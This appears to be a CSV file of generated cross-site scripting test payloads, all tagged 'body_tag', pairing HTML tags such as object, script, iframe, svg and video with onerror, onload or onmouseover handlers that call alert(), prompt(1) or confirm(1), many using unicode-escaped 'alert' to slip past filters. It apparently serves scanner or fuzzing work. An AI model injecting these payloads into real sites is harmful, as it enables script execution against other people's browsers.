eval_place,injection_code
body_tag,<object src=saivs.js onerror=alert(); /></canvas>
body_tag,<object/onerror=al\u0065rt();onmouseover=alert();>onmouseover=alert();
body_tag,<frameset><frame/onload=alert();saivs.js </embed>data=
body_tag,<object src=/ data=saivs.html <select/</canvas>
body_tag,data=saivs.html <object <object data=saivs.html <video><source/
body_tag,javascript:alert();<object <select data=saivs.html <video><source/
body_tag,"type=""text/x-scriptlet"" <object <iframe/data=saivs.html <video><source/"
body_tag,<object data=saivs.html <script \u0061lert``;</script>
body_tag,<a/><script>al\u0065rt``;</script>
body_tag,<script/<</script>\u0061lert();</script>
body_tag,<object onerror=\u0061lert();src=saivs.js <img <frameset><frame 
body_tag,"<object/onerror=javascript:alert();type=""image"" <frameset><frame </object>"
body_tag,<object <object onerror=al\u0065rt(); /><select/
body_tag,<iframe <input/onload=alert();>alert``;
body_tag,<svg/<canvas onload=alert();></select>
body_tag,<frameset><frame/<frameset><frame/onload=alert(); />onload=alert();
body_tag,<object data=saivs.html alert``;onerror=\u0061lert();</frameset>
body_tag,"<object/onerror=al\u0065rt();>src=""data:text/html,<svg/"
body_tag,<script/</frameset>onerror=al\u0065rt();</script> 
body_tag,<iframe/onload=alert();><iframe </canvas>
body_tag,<object/src=saivs.js data=saivs.html </select><a 
body_tag,<object data=saivs.html </select><object/<option 
body_tag,<video><source \u0061lert``;<object/onerror=al\u0065rt(); />
body_tag,"</img>src=""data:text/html,onload=alert();al\u0065rt();<option "
body_tag,"<video><source/onerror=alert();type=""image""  />/"
body_tag,<video><source saivs.js onerror=\u0061lert(); />#
body_tag,<body data=saivs.html onload=alert(); />'
body_tag,</object><object data=saivs.html </canvas><svg/
body_tag,"onload=alert();""<object onerror=\u0061lert(); /><canvas "
body_tag,"data=""data:text/html,<object onerror=javascript:alert(); /></embed>"
body_tag,"onload=alert();""<object/onerror=\u0061lert();src=x </img>"
body_tag,onerror=al\u0065rt();<object data=saivs.html data=</img>
body_tag,onerror=javascript:alert();<object/src=/ data=saivs.html </iframe>
body_tag,onerror=\u0061lert();<object/data=saivs.html src=saivs.js <frameset><frame 
body_tag,"src=""data:text/html,<object <embed/data=saivs.html </iframe>"
body_tag,"type=""image"" <object src=saivs.js data=saivs.html </iframe>"
body_tag,src=x <object src=x data=saivs.html </frameset>
body_tag,<object/data=saivs.html <option \u0061lert();</object>
body_tag,"<body onload=alert();type=""image"" </a><input "
body_tag,<video><source onerror=alert();data=saivs.html </script><a/
body_tag,<script>al\u0065rt();</script><script><script>
body_tag,<script>prompt(1);</script></script></script>
body_tag,<script>prompt(1);</script><video><source/<script>
body_tag,</script>onmouseover=alert();<script>onerror=alert();</script>
body_tag,<script>\u0061lert``;</script><object/<script>
body_tag,<script onerror=al\u0065rt();</script>al\u0065rt``;</script>
body_tag,<object onerror=al\u0065rt(); /><al\u0065rt();
body_tag,<object/onerror=\u0061lert(); />javascript:alert(); 
body_tag,<video><source/onerror=alert();data=saivs.html <script> 
body_tag,<body onload=alert();data=saivs.html </object>javascript:alert();
body_tag,<video><source onerror=alert();src=x <script> 
body_tag,<object javascript:\u0061lert();<script data=saivs.html </a>
body_tag,\u0061lert``;<object/data=saivs.html <frameset><frame/<frameset><frame 
body_tag,al\u0065rt``;<object/data=saivs.html </object><canvas/
body_tag,\u0061lert``;<object/data=saivs.html </select>src=x 
body_tag,"al\u0065rt``;<object data=saivs.html </canvas>src=""data:text/html,"
body_tag,<object onerror=al\u0065rt();prompt(1); </img>
body_tag,<select src=saivs.js \u0061lert();<<object/
body_tag,<object data=saivs.html \u0061lert();'</object>
body_tag,"<object/data=saivs.html onload=alert();""></iframe>"
body_tag,<object data=saivs.html onmouseover=alert(); /><select/
body_tag,<object data=saivs.html onmouseover=alert(); /></select>
body_tag,<object/onerror=\u0061lert();javascript:alert(); /><object/
body_tag,<object onerror=al\u0065rt();onerror=alert(); /></canvas>
body_tag,<object data=javascript:alert();><object/
body_tag,<object/data=saivs.html data=></select>
body_tag,"<object/onerror=javascript:alert();type=""image"" \u0061lert();</canvas>"
body_tag,<object data=saivs.html </canvas>onload=alert();</embed>
body_tag,"<object <input/onerror=\u0061lert();type=""image"" <frameset><frame/"
body_tag,</object><iframe onload=alert();data=saivs.html </frameset>
body_tag,confirm(1);<script <script>\u0061lert``;</script>
body_tag,\u0061lert``;<script/<script>al\u0065rt();</script>
body_tag,</iframe></frameset><script>prompt(1);</script>
body_tag,<script/confirm(1);<script>onerror=\u0061lert();</script>
body_tag,<body/onload=alert();saivs.js </select>#
body_tag,<svg/onload=alert();saivs.js src=saivs.js >
body_tag,<body/onload=alert(); /> /><frameset><frame 
body_tag,<body/onload=alert(); /> /><option/
body_tag,<object onerror=\u0061lert(); />al\u0065rt();<option/
body_tag,<iframe/onload=alert();>onerror=javascript:alert();<script 
body_tag,</object><object/data=saivs.html <video><source <a 
body_tag,<object src=x data=saivs.html javascript:alert();>
body_tag,"""<object onerror=\u0061lert();onmouseover=alert();>"
body_tag, /><object/data=saivs.html <object </embed>
body_tag,"""<object/data=saivs.html <input/</iframe>"
body_tag,<object data=saivs.html <select/javascript:alert();</a>
body_tag,<object data=saivs.html </canvas>data=saivs.html onmouseover=alert();
body_tag,<object/data=saivs.html </embed>onerror=alert();onerror=\u0061lert();
body_tag,<object data=saivs.html </embed>alert();onerror=javascript:alert();
body_tag,<frameset><frame/src=  javascript:alert();saivs.js </object>
body_tag,<object <embed/onerror=\u0061lert();src=x </select>
